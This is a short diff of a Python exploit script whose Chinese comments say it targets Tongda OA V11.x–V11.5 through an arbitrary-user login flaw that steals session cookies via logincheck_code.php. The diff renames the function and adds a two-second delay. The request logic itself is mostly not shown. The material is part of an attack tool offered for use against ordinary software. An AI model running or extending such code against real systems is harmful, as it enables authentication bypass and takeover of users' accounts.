@@ -1,5 +1,6 @@
 import requests
-def getV11Session(host): # 通达V11.x-V11.5任意用户登录获取cookie
+import time
+def getSession(host): # 通达V11.x-V11.5任意用户登录获取cookie
     content = ''
     content += '[->] 正在尝试通达<V11.5任意用户登录获取cookie' + '\n'
     url = host + 'logincheck_code.php'
@@ -25,4 +26,5 @@ def getV11Session(host): # 通达V11.x-V11.5任意用户登录获取cookie
         pass
 
 def run(host):
-    getV11Session(host)
+    time.sleep(2)
+    getSession(host)
